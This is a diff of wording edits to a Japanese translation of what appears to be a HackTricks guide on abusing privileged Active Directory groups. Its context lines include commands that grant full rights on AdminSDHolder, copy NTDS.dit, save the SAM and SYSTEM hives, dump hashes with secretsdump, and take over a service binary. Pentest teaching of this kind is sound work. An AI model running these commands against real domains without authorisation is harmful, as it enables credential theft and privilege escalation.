@@ -17,7 +17,7 @@ GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png
 
 <figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
-[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も高度なコミュニティツールによって強化された**ワークフローを簡単に構築し、自動化**します。\
+[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)を使用して、世界で最も先進的なコミュニティツールによって駆動される**ワークフローを簡単に構築し、自動化**します。\
 今すぐアクセスを取得：
 
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
@@ -44,7 +44,7 @@ Get-NetGroupMember -Identity "Account Operators" -Recurse
 
 攻撃者は、**AdminSDHolder** グループの ACL を変更し、標準ユーザーに完全な権限を付与することでこれを悪用する可能性があります。これにより、そのユーザーはすべての保護されたグループに対して完全な制御を持つことになります。このユーザーの権限が変更または削除された場合、システムの設計により、1時間以内に自動的に復元されます。
 
-メンバーを確認し、権限を変更するためのコマンドには次のものが含まれます:
+メンバーを確認し、権限を変更するためのコマンドには次が含まれます:
 ```powershell
 Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
@@ -76,13 +76,13 @@ C:\> .\PsService.exe security AppReadiness
 
 `Backup Operators`グループのメンバーシップは、`SeBackup`および`SeRestore`特権により、`DC01`ファイルシステムへのアクセスを提供します。これらの特権により、明示的な権限がなくても、`FILE_FLAG_BACKUP_SEMANTICS`フラグを使用してフォルダのトラバーサル、リスト表示、およびファイルコピー機能が可能になります。このプロセスには特定のスクリプトを利用する必要があります。
 
-グループメンバーをリストするには、次を実行します:
+グループメンバーをリストするには、次のコマンドを実行します:
 ```powershell
 Get-NetGroupMember -Identity "Backup Operators" -Recurse
 ```
 ### ローカル攻撃
 
-これらの特権をローカルで利用するために、以下の手順が実行されます：
+これらの特権をローカルで活用するために、以下の手順が実行されます：
 
 1. 必要なライブラリをインポートする：
 ```bash
@@ -131,7 +131,7 @@ robocopy /B F:\Windows\NTDS .\ntds ntds.dit
 reg save HKLM\SYSTEM SYSTEM.SAV
 reg save HKLM\SAM SAM.SAV
 ```
-4. `NTDS.dit`からすべてのハッシュを取得する:
+4. `NTDS.dit` からすべてのハッシュを取得する:
 ```shell-session
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
@@ -150,7 +150,7 @@ echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\
 
 ## DnsAdmins
 
-**DnsAdmins**グループのメンバーは、DNSサーバー（通常はドメインコントローラー上にホストされている）でSYSTEM権限を持つ任意のDLLをロードするためにその権限を悪用できます。この能力は、重大な悪用の可能性をもたらします。
+**DnsAdmins**グループのメンバーは、DNSサーバー上でSYSTEM権限を持つ任意のDLLをロードするためにその権限を悪用できます。これは通常、ドメインコントローラー上でホストされています。この能力は、重大な悪用の可能性をもたらします。
 
 DnsAdminsグループのメンバーをリストするには、次のコマンドを使用します：
 ```powershell
@@ -199,7 +199,7 @@ Get-NetGroupMember -Identity "Event Log Readers" -Recurse
 Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
 ```
 ## Exchange Windows Permissions
-このグループは、ドメインオブジェクトのDACLを変更でき、DCSync権限を付与する可能性があります。このグループを利用した特権昇格の手法は、Exchange-AD-Privesc GitHubリポジトリに詳述されています。
+このグループは、ドメインオブジェクトのDACLを変更でき、潜在的にDCSync権限を付与することができます。このグループを利用した特権昇格の手法は、Exchange-AD-Privesc GitHubリポジトリに詳述されています。
 ```powershell
 # List members
 Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
@@ -214,11 +214,11 @@ Firefox の Mozilla Maintenance Service は、Hyper-V 管理者によって SYST
 takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
 sc.exe start MozillaMaintenance
 ```
-Note: ハードリンクの悪用は、最近のWindowsアップデートで軽減されています。
+Note: ハードリンクの悪用は最近のWindowsアップデートで軽減されています。
 
 ## 組織管理
 
-**Microsoft Exchange**が展開されている環境では、**Organization Management**という特別なグループが重要な権限を持っています。このグループは、**すべてのドメインユーザーのメールボックスにアクセスする**特権を持ち、**「Microsoft Exchange Security Groups」**組織単位（OU）に対して**完全な制御**を維持しています。この制御には、特権昇格に悪用される可能性のある**`Exchange Windows Permissions`**グループが含まれます。
+**Microsoft Exchange**が展開されている環境では、**Organization Management**という特別なグループが重要な権限を持っています。このグループは**すべてのドメインユーザーのメールボックスにアクセスする**特権を持ち、**'Microsoft Exchange Security Groups'**組織単位（OU）に対して**完全な制御**を維持しています。この制御には、特権昇格に悪用可能な**`Exchange Windows Permissions`**グループが含まれます。
 
 ### 特権の悪用とコマンド
 
@@ -240,7 +240,7 @@ Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users
 さらにRDPを悪用するための洞察は、専用のpentestingリソースにあります。
 
 #### リモート管理ユーザー
-メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、以下の方法で達成されます：
+メンバーは**Windows Remote Management (WinRM)**を介してPCにアクセスできます。これらのメンバーの列挙は、次の方法で達成されます：
 ```powershell
 Get-NetGroupMember -Identity "Remote Management Users" -Recurse
 Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
@@ -277,8 +277,8 @@ Get-NetGroupMember -Identity "Server Operators" -Recurse
 {% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}
 
 {% hint style="success" %}
-AWSハッキングを学び、練習する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-GCPハッキングを学び、練習する： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
